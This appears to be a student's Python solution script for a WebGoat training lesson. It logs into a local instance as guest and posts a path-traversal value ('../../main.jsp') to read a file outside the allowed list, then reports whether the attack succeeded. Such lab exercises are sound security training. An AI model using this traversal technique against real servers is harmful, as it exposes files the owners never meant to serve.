import requests
import json

s = requests.Session();
payload = {'password': 'guest', 'username': 'guest'}
r = s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data=payload)
##Used s to maintain session without having to keep track of or modify cookies

##Accessed lesson menu first to find address of menu item we need since it is dynamically generated
r = s.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc")
resp_dict = json.loads(r.text)
list1 = resp_dict[2]['children']
link = list1[1]['link']

##Crafted the link, then retrieved the page
str = 'http://127.0.0.1:8080/WebGoat/' + link
r = s.get(str)

##At the page with vulnerability now
##Request an item not on the list of files given on this page
req = {'SUBMIT': 'View+File', 'File': '../../main.jsp'} 
r = s.post(str, data=req)

##Used the in function to scan http response for the text confirming exploit worked.
results = "Congratulations! Access to file allowed" in r.text
if results: 
	 print("Attack Successful")
else: 
	print("Attack Failed, Vulnerability Not Present")
